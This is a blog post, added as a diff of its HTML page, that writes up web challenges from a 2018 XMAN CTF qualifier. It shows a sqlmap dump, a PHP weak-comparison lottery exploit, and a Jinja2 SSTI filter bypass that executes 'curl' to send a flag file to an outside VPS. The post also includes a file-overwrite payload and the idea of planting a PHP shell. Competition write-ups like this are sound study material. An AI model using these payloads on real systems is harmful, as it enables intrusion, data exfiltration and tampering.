@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="暑假第一场比赛,做了个web部分,简单写下 NewsCenter描述:This is to0 s1mple 地址:http:&#x2F;&#x2F;47.96.118.255:8888&#x2F; 1sqlmap -u &quot;http:&#x2F;&#x2F;47.96.118.255:33066&#x2F;&quot; --data &quot;search&#x3D;2&quot; -D news -T secret_table --dump   Lott">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xman选拔赛web部分">
+<meta property="og:url" content="http://example.com/2018/07/16/xman%E9%80%89%E6%8B%94%E8%B5%9Bweb%E9%83%A8%E5%88%86/index.html">
+<meta property="og:site_name" content="blacsheep&#39;s blog">
+<meta property="og:description" content="暑假第一场比赛,做了个web部分,简单写下 NewsCenter描述:This is to0 s1mple 地址:http:&#x2F;&#x2F;47.96.118.255:8888&#x2F; 1sqlmap -u &quot;http:&#x2F;&#x2F;47.96.118.255:33066&#x2F;&quot; --data &quot;search&#x3D;2&quot; -D news -T secret_table --dump   Lott">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/2018/07/1-3.jpg">
+<meta property="og:image" content="http://example.com/images/2018/07/2-1.jpg">
+<meta property="og:image" content="http://example.com/images/2018/07/3-1.jpg">
+<meta property="og:image" content="http://example.com/images/2018/07/4-1.jpg">
+<meta property="og:image" content="http://example.com/images/2018/07/5-1.jpg">
+<meta property="og:image" content="http://example.com/images/2018/07/6-1.jpg">
+<meta property="og:image" content="http://example.com/images/2018/07/7.jpg">
+<meta property="og:image" content="http://example.com/images/2018/07/flag.jpg">
+<meta property="og:image" content="http://example.com/images/2018/07/Screenshot-from-2018-07-16-17-34-01.png">
+<meta property="og:image" content="http://example.com/images/2018/07/Screenshot-from-2018-07-16-17-35-16.png">
+<meta property="og:image" content="http://example.com/images/2018/07/Screenshot-from-2018-07-16-17-53-51.png">
+<meta property="article:published_time" content="2018-07-16T09:44:06.000Z">
+<meta property="article:modified_time" content="2023-07-10T02:13:29.466Z">
+<meta property="article:author" content="blacsheep">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/2018/07/1-3.jpg">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>xman选拔赛web部分</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2018/07/17/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AD%A6%E4%B9%A0/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2018/07/13/googlectf%E4%B8%AD%E4%B8%80%E9%81%93xss%E9%A2%98/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2018/07/16/xman%E9%80%89%E6%8B%94%E8%B5%9Bweb%E9%83%A8%E5%88%86/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2018/07/16/xman%E9%80%89%E6%8B%94%E8%B5%9Bweb%E9%83%A8%E5%88%86/&text=xman选拔赛web部分"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2018/07/16/xman%E9%80%89%E6%8B%94%E8%B5%9Bweb%E9%83%A8%E5%88%86/&title=xman选拔赛web部分"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2018/07/16/xman%E9%80%89%E6%8B%94%E8%B5%9Bweb%E9%83%A8%E5%88%86/&is_video=false&description=xman选拔赛web部分"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=xman选拔赛web部分&body=Check out this article: http://example.com/2018/07/16/xman%E9%80%89%E6%8B%94%E8%B5%9Bweb%E9%83%A8%E5%88%86/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2018/07/16/xman%E9%80%89%E6%8B%94%E8%B5%9Bweb%E9%83%A8%E5%88%86/&title=xman选拔赛web部分"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2018/07/16/xman%E9%80%89%E6%8B%94%E8%B5%9Bweb%E9%83%A8%E5%88%86/&title=xman选拔赛web部分"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2018/07/16/xman%E9%80%89%E6%8B%94%E8%B5%9Bweb%E9%83%A8%E5%88%86/&title=xman选拔赛web部分"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2018/07/16/xman%E9%80%89%E6%8B%94%E8%B5%9Bweb%E9%83%A8%E5%88%86/&title=xman选拔赛web部分"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2018/07/16/xman%E9%80%89%E6%8B%94%E8%B5%9Bweb%E9%83%A8%E5%88%86/&name=xman选拔赛web部分&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2018/07/16/xman%E9%80%89%E6%8B%94%E8%B5%9Bweb%E9%83%A8%E5%88%86/&t=xman选拔赛web部分"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#NewsCenter"><span class="toc-number">1.</span> <span class="toc-text">NewsCenter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lottery"><span class="toc-number">2.</span> <span class="toc-text">Lottery</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Confusion1"><span class="toc-number">3.</span> <span class="toc-text">Confusion1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8E%E8%AE%B0"><span class="toc-number">4.</span> <span class="toc-text">后记</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        xman选拔赛web部分
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">blacsheep</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2018-07-16T09:44:06.000Z" class="dt-published" itemprop="datePublished">2018-07-16</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/web%E7%AF%87/">web篇</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>暑假第一场比赛,做了个web部分,简单写下</p>
+<h3 id="NewsCenter"><a href="#NewsCenter" class="headerlink" title="NewsCenter"></a>NewsCenter</h3><p><strong>描述:This is to0 s1mple</strong> 地址:<a target="_blank" rel="noopener" href="http://47.96.118.255:8888/" title="http://47.96.118.255:8888/">http://47.96.118.255:8888/</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://47.96.118.255:33066/&quot; --data &quot;search=2&quot; -D news -T secret_table --dump</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/2018/07/1-3.jpg" alt="blacsheep"></p>
+<h3 id="Lottery"><a href="#Lottery" class="headerlink" title="Lottery"></a>Lottery</h3><p><strong>没有描述…</strong> <a target="_blank" rel="noopener" href="http://47.96.118.255:8888/" title="http://47.96.118.255:8888/">http://47.96.118.255:8888/</a> 随意看下,发现.git泄漏,githack一下,发现没文件,git log一下然后reset –hard <img src="/images/2018/07/2-1.jpg" alt="blacsheep"> 关键代码api.php,看到判断函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">buy</span>(<span class="params"><span class="variable">$req</span></span>)</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">require_registered</span>();</span><br><span class="line">    <span class="title function_ invoke__">require_min_money</span>(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$money</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;money&#x27;</span>];</span><br><span class="line">    <span class="variable">$numbers</span> = <span class="variable">$req</span>[<span class="string">&#x27;numbers&#x27;</span>];</span><br><span class="line">    <span class="variable">$win_numbers</span> = <span class="title function_ invoke__">random_win_nums</span>();</span><br><span class="line">    <span class="variable">$same_count</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="number">7</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$numbers</span>[<span class="variable">$i</span>] == <span class="variable">$win_numbers</span>[<span class="variable">$i</span>])&#123;</span><br><span class="line">            <span class="variable">$same_count</span>++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$same_count</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="variable">$prize</span> = <span class="number">5</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="variable">$prize</span> = <span class="number">20</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            <span class="variable">$prize</span> = <span class="number">300</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            <span class="variable">$prize</span> = <span class="number">1800</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">            <span class="variable">$prize</span> = <span class="number">200000</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">            <span class="variable">$prize</span> = <span class="number">5000000</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="variable">$prize</span> = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$money</span> += <span class="variable">$prize</span> - <span class="number">2</span>;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;money&#x27;</span>] = <span class="variable">$money</span>;</span><br><span class="line">    <span class="title function_ invoke__">response</span>([<span class="string">&#x27;status&#x27;</span>=&gt;<span class="string">&#x27;ok&#x27;</span>,<span class="string">&#x27;numbers&#x27;</span>=&gt;<span class="variable">$numbers</span>, <span class="string">&#x27;win_numbers&#x27;</span>=&gt;<span class="variable">$win_numbers</span>, <span class="string">&#x27;money&#x27;</span>=&gt;<span class="variable">$money</span>, <span class="string">&#x27;prize&#x27;</span>=&gt;<span class="variable">$prize</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>容易看到</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$numbers</span>[<span class="variable">$i</span>] == <span class="variable">$win_numbers</span>[<span class="variable">$i</span>])&#123;</span><br><span class="line">            <span class="variable">$same_count</span>++;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后数据的传入没有做限制,那么我们只要去构造一下json就可以拿到flag,众所周知,弱类型的字符只要不是’0’都等于Bool类型的True,那么构造如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$new</span> = <span class="keyword">array</span>(True,True,True,True,True,True,True);</span><br><span class="line"><span class="variable">$num</span> = <span class="keyword">array</span>(<span class="string">&#x27;action&#x27;</span> =&gt; <span class="string">&quot;buy&quot;</span>,<span class="string">&quot;numbers&quot;</span>=&gt; <span class="variable">$new</span> );</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$num</span>);</span><br><span class="line"><span class="comment">//&#123;&quot;action&quot;:&quot;buy&quot;,&quot;numbers&quot;:[true,true,true,true,true,true,true]&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>简单传几次就拿到足够金币,买到flag <img src="/images/2018/07/3-1.jpg" alt="blacsheep"> <img src="/images/2018/07/4-1.jpg" alt="blacsheep"> 不是很懂那些挂着脚本能拿到flag的人…真是打扰了…</p>
+<h3 id="Confusion1"><a href="#Confusion1" class="headerlink" title="Confusion1"></a>Confusion1</h3><p><strong>confusion1的描述:One day, Bob said “PHP is the best language!”, but Alice didn’t agree it, so Alice write a website to proof it. She published it before finish it but I find something WRONG at some page.(Please DO NOT use scanner!)</strong> 洞很好找,但绕过确实花了我蛮久的… flask的ssti <img src="/images/2018/07/5-1.jpg" alt="blacsheep"> 源码里获得提示:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--Flag @ /opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt--&gt;</span><br><span class="line">&lt;!--Salt @ /opt/salt_b420e8cfb8862548e68459ae1d37a1d5.txt--&gt;</span><br></pre></td></tr></table></figure>
+
+<p>ok,一般来说就直接一波payload打过去,比较经典的就是用object类的子类file来read,但是并不行 <img src="/images/2018/07/6-1.jpg" alt="blacsheep"> 类似的过滤的还有class,ls等一些关键的字符串 过滤参考的一篇文章 <a target="_blank" rel="noopener" href="https://0day.work/jinja2-template-injection-filter-bypasses/" title="https://0day.work/jinja2-template-injection-filter-bypasses/">https://0day.work/jinja2-template-injection-filter-bypasses/</a> 里面提供了一些bypass 提供一个简单的测试脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    temp=<span class="built_in">input</span>()</span><br><span class="line">    r=requests.get(<span class="string">&quot;http://47.96.118.255:2333/&#123;&#123;&quot;</span>+temp+<span class="string">&quot;&#125;&#125;&quot;</span>)</span><br><span class="line">    res=re.findall(<span class="string">r&#x27;The requested URL .+ was not found on this server&#x27;</span>,r.text)</span><br><span class="line">    <span class="keyword">if</span> res:</span><br><span class="line">        <span class="built_in">print</span>(res[<span class="number">0</span>].replace(<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>).replace(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&quot;&gt;&quot;</span>).replace(<span class="string">&#x27;&#x27;&#x27;,&quot;&#x27;&quot;))</span></span><br><span class="line"><span class="string">    else:</span></span><br><span class="line"><span class="string">        print(r.text)</span></span><br></pre></td></tr></table></figure>
+
+<p>简单测试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">request</span><br><span class="line">The requested URL /&lt;Request &#x27;http://47.96.118.255:2333/&#123;&#123;request&#125;&#125;&#x27; [GET]&gt; was not found on this server</span><br><span class="line">request[&quot;__clas&quot;+&quot;s__&quot;]</span><br><span class="line">The requested URL /&lt;class &#x27;flask.wrappers.Request&#x27;&gt; was not found on this server</span><br><span class="line">request[&quot;__clas&quot;+&quot;s__&quot;].__bases__</span><br><span class="line">The requested URL /(&lt;class &#x27;werkzeug.wrappers.Request&#x27;&gt;, &lt;class &#x27;flask.wrappers.JSONMixin&#x27;&gt;) was not found on this server</span><br><span class="line">request[&quot;__clas&quot;+&quot;s__&quot;].__bases__[0].__bases__</span><br><span class="line">The requested URL /(&lt;class &#x27;werkzeug.wrappers.BaseRequest&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.AcceptMixin&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.ETagRequestMixin&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.UserAgentMixin&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.AuthorizationMixin&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.CommonRequestDescriptorsMixin&#x27;&gt;) was not found on this server</span><br><span class="line">request[&quot;__clas&quot;+&quot;s__&quot;].__bases__[0].__bases__[0].__bases__</span><br><span class="line">The requested URL /(&lt;type &#x27;object&#x27;&gt;,) was not found on this server</span><br><span class="line">request[&quot;__clas&quot;+&quot;s__&quot;].__bases__[0].__bases__[0].__bases__[0]</span><br><span class="line">The requested URL /&lt;type &#x27;object&#x27;&gt; was not found on this server</span><br><span class="line">request[&quot;__clas&quot;+&quot;s__&quot;].__bases__[0].__bases__[0].__bases__[0][&quot;__subcla&quot;+&quot;ss__&quot;]</span><br><span class="line">The requested URL / was not found on this server</span><br><span class="line">request[&quot;__clas&quot;+&quot;s__&quot;].__bases__[0].__bases__[0].__bases__[0][&quot;__subcla&quot;+&quot;sses__&quot;]</span><br><span class="line">The requested URL /&lt;built-in method __subclasses__ of type object at 0x7ff87ae16c40&gt; was not found on this server</span><br><span class="line">request[&quot;__clas&quot;+&quot;s__&quot;].__bases__[0].__bases__[0].__bases__[0][&quot;__subcla&quot;+&quot;sses__&quot;]()[40]</span><br><span class="line">The requested URL /&lt;type &#x27;file&#x27;&gt; was not found on this server</span><br><span class="line">request[&quot;__clas&quot;+&quot;s__&quot;].__bases__[0].__bases__[0].__bases__[0][&quot;__subcla&quot;+&quot;sses__&quot;]()[59].__init__.__getattribute__(&#x27;func_global&#x27;+&#x27;s&#x27;)[&#x27;linecache&#x27;].__dict__.values()[12].__getattribute__(&#x27;s&#x27;+&#x27;ystem&#x27;)(&#x27;curl http://119.28.22.85/`tac /opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt`&#x27;)</span><br><span class="line">The requested URL /0 was not found on this server</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/2018/07/7.jpg" alt="blacsheep"> 然后vps上拿到flag <img src="/images/2018/07/flag.jpg" alt="blacsheep"> subclasses之前一直打成subclass,心疼自己…吃了没文化的亏orz… 这里也记录一个小彩蛋吧,打request的时候发现request里面有个file成员</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">request[&#x27;environ&#x27;][&quot;wsgi.errors&quot;]</span><br><span class="line">The requested URL /&lt;open file &#x27;&lt;stderr&gt;&#x27;, mode &#x27;w&#x27; at 0x7ff87b04c1e0&gt; was not found on this server</span><br></pre></td></tr></table></figure>
+
+<p>那么我们可以干什么呢?我们可以调用这个成员的__init__函数,将这个文件进行重打开,之后的文件就可以任意写了,本地测试一下 payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:5000/?name=&#123;&#123;request[&#x27;environ&#x27;][&#x27;wsgi.errors&#x27;].__init__(&#x27;./app.py&#x27;,&#x27;w&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/2018/07/Screenshot-from-2018-07-16-17-34-01.png" alt="blacsheep"> 然后我们就可以看到本地的app.py被覆盖了 <img src="/images/2018/07/Screenshot-from-2018-07-16-17-35-16.png" alt="blacsheep"> 如果某个目录还有个php服务你就可以去写个php的shell,不过直接访问会被转义掉字符,用burp抓一下就不会了 <img src="/images/2018/07/Screenshot-from-2018-07-16-17-53-51.png" alt="blacsheep"> 测试的app.py文件</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template_string, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    template = <span class="string">&#x27;&lt;h1&gt;hello &#123;&#125;!&lt;h1&gt;&#x27;</span>.<span class="built_in">format</span>(name)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>比较有意思,不过当天比赛的时候很迷,每次我一写文件(并不是写的app.py,当时是随意写的一个123.php)，服务器就直接宕机…可还行… 最后一道web没看,晚上服务器反正又宕机了,不是我打的…之后再说吧..</p>
+<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>环境已经关闭了,复现看他们开不开源吧,最后一道web又是python反序列化,老生常谈的问题了,这里放一下官方wp:<a target="_blank" rel="noopener" href="https://www.xctf.org.cn/library/details/8723e039db0164e2f7345a12d2edd2a5e800adf7/" title="https://www.xctf.org.cn/library/details/8723e039db0164e2f7345a12d2edd2a5e800adf7/">https://www.xctf.org.cn/library/details/8723e039db0164e2f7345a12d2edd2a5e800adf7/</a> 然后第三个web他们绕过比我的简单,他们是调用的其它参数来获取的,payload如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.[request.args.a][request.args.b][<span class="number">2</span>][request.args.c]()[<span class="number">40</span>](<span class="string">&#x27;/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt&#x27;</span>)[request.args.d]()&#125;&#125;?a=__class__&amp;b=__mro__&amp;c=__subclasses__&amp;d=read</span><br></pre></td></tr></table></figure>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#NewsCenter"><span class="toc-number">1.</span> <span class="toc-text">NewsCenter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lottery"><span class="toc-number">2.</span> <span class="toc-text">Lottery</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Confusion1"><span class="toc-number">3.</span> <span class="toc-text">Confusion1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8E%E8%AE%B0"><span class="toc-number">4.</span> <span class="toc-text">后记</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2018/07/16/xman%E9%80%89%E6%8B%94%E8%B5%9Bweb%E9%83%A8%E5%88%86/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2018/07/16/xman%E9%80%89%E6%8B%94%E8%B5%9Bweb%E9%83%A8%E5%88%86/&text=xman选拔赛web部分"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2018/07/16/xman%E9%80%89%E6%8B%94%E8%B5%9Bweb%E9%83%A8%E5%88%86/&title=xman选拔赛web部分"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
